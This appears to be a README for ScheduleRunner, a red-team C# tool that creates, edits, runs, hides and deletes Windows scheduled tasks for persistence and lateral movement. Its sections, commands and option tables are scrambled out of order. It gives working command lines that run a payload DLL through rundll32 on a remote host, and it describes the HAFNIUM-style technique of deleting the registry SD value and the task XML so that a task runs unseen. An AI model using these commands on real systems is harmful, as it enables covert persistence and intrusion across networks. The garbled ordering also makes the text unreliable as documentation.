
![HowTo](https://github.com/netero1010/ScheduleRunner/raw/main/hiding_scheduled_task.png)
![HowTo](screenshot.png)
# ScheduleRunner - A C# tool with more flexibility to customize scheduled task for both persistence and lateral movement in red team operation
## Example
## Hiding Scheduled Task Technique
## Library and Reference Used:
## Methods (/method):
## Options for scheduled task creation (/method:create):
## Options for scheduled task deletion (/method:delete):
## Options for scheduled task editing (/method:edit):
## Options for scheduled task execution (/method:run):
## Options for scheduled task lateral movement (/method:move):
## Options for scheduled task query (/method:query):
## Screenshot:
### Demo
### Disadvantage of this technique:
**Create a scheduled task called "Cleanup" that will be executed every 4 hours on a remote server**
**Create a scheduled task called "Cleanup" that will be executed every day at 11:30 p.m.**
**Create a scheduled task called "Cleanup" using hiding scheduled task technique:**
**Delete a scheduled task called "Cleanup" that used hiding scheduled task technique:**
**Delete a scheduled task called "Cleanup"**
**Edit a scheduled task called "test" by adding a new exec action and specifying the order (1-based) in which it will appear in the action list. In this example, the new exec action will be added first**
**Edit a scheduled task called "test" by adding a new exec action with argument and specifying the order (1-based) in which it will appear in the action list. In this example, the new exec action will be added first**
**Edit a scheduled task called "test" by adding a new exec action with argument and specifying the order (1-based) in which will appear in the action list and adding a trigger. In this example, the new exec action will be added first and the trigger will be onlogon**
**Edit a scheduled task called "test" which has 1 exec action and will be replaced with the program and argument**
**Edit a scheduled task called "test" which has 1 exec action and will be replaced with the program**
**Edit a scheduled task called "test" which has multiple exec actions and one of them(oldaction) will be replaced with the program and argument**
**Edit a scheduled task called "test" which has multiple exec actions and one of them(oldaction) will be replaced with the program**
**Execute a scheduled task called "Cleanup"**
**Perform lateral movement using scheduled task to a remote server using a specific user account**
**Query all scheduled tasks under a specific folder "\Microsoft\Windows\CertificateServicesClient" on a remote server**
**Query all sub-folders in scheduled task**
**Query details for a scheduled task called "Cleanup" under "\Microsoft\Windows\CertificateServicesClient" folder on a remote server**
----
1. Delete "SD" value from "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\\[task name]"
2. Delete scheduled task XML file "C:\Windows\System32\Tasks\\[task name]"
A number of C# tools were already developed to simulate the attack using scheduled task. I have been playing around with some of them but each of them has its own limitations on customizing the scheduled task. Therefore, this project aims to provide a C# tool (CobaltStrike execute-assembly friendly) to include the features that I need and provide enough flexibility on customizing the scheduled task.
In the edit functionality the CLI arguments "/folder", "/remoteserver", "/user" and "/technique" are used as expected in the other methods too.
Scheduled task is one of the most popular attack technique in the past decade and now it is still commonly used by hackers/red teamers for persistence and lateral movement. 
The task will continue to run util next system reboot even if the task is deleted via registry. Therefore, it is better not to use this technique in server for your operation.
This technique was used by threat actor - HAFNIUM and discovered by Microsoft recently. It aims to make the scheduled task unqueriable by tools and unseeable by Task Scheduler.
To remove scheduled task that is created using this technique require to add "/technique:hide" in the delete method to remove it properly.
To use this technique, you are required to have "NT AUTHORITY/SYSTEM" and ScheduleRunner will do the following for you:
[*] are mandatory fields.
`ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"Some description" /author:netero1010 /technique:hide`
`ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"Some description" /author:netero1010`
`ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:\temp\payload.dll /remoteserver:TARGET-PC01`
`ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide`
`ScheduleRunner.exe /method:delete /taskname:Cleanup`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:"-m 1" /oldaction:"C:\Windows\notepad.exe"`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:"-m 1" /order:1 /trigger:onlogon`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:"-m 1" /order:1`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:"-m 1"`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /oldaction:"C:\Windows\notepad.exe"`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /order:1`
`ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe`
`ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010`
`ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01`
`ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01`
`ScheduleRunner.exe /method:queryfolders`
`ScheduleRunner.exe /method:run /taskname:Cleanup`
|  Method | Function  |
| ------------ | ------------ |
| ---------------- | ---------------- |
| /argument | Specify the command line argument for the program |
| /author | Specify the author of the scheduled task |
| /description | Specify the description for the scheduled task |
| /folder | Specify the folder where the scheduled task stores (default: \\) |
| /modifier | Specify how often the task runs within its schedule type. Applicable only for schedule type such as "minute" (e.g., 1-1439 minutes), "hourly" (e.g., 1-23 hours) and "weekly" (e.g., mon,sat,sun) |
| /oldaction | Specify the old program that will be replaced with program |
| /order | Specify the index in actions in which the new program will be added (1-based) |
| /remoteserver | Specify the hostname or IP address of a remote computer |
| /starttime | Specify the start time for daily schedule type (e.g., 23:30) |
| /taskname | Specify the name of the scheduled task |
| /technique | Specify evasion technique:<br>- "hide": A technique used by HAFNIUM malware that will hide the scheduled task from task query<br><br>[!] https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/<br>[!] This technique does not support remote execution due to privilege of remote registry. It requires "NT AUTHORITY\SYSTEM" and the task will continue to run until system reboot even after task deletion |
| /technique | Specify when the scheduled task was created using evasion technique:<br>- "hide": Delete scheduled task that used "hiding scheduled task" technique<br><br>[!] The deletion requires "NT AUTHORITY\SYSTEM" and the task will continue to run until system reboot even after task deletion |
| /trigger | Specify the schedule type. The valid values include: "daily", "onlogon" |
| /trigger | Specify the schedule type. The valid values include: "minute", "hourly", "daily", "weekly", "onstart", "onlogon", and "onidle" |
| /user | Run the task with a specified user account |
| Hiding scheduled task technique | https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/ |
| Library | Link |
| Reference | Link |
| SharpPersist | https://github.com/mandiant/SharPersist |
| TaskScheduler | https://github.com/dahall/TaskScheduler |
| [*] /program | Specify the program that the task runs |
| [*] /program | Specify the program that the task will run |
| [*] /remoteserver | Specify the hostname or IP address of a remote computer |
| [*] /taskname | Specify the name of the scheduled task |
| [*] /trigger | Specify the schedule type. The valid values include: "minute", "hourly", "daily", "weekly", "onstart", "onlogon", and "onidle" |
| create | Create a new scheduled task |
| delete | Delete an existing scheduled task |
| edit | Edit an existing scheduled task |
| move | Perform lateral movement using scheduled task (automatically create, run and delete) |
| query | Query details for a scheduled task or all scheduled tasks under a folder |
| queryfolders | Query all sub-folders in scheduled task  |
| run | Execute an existing scheduled task |
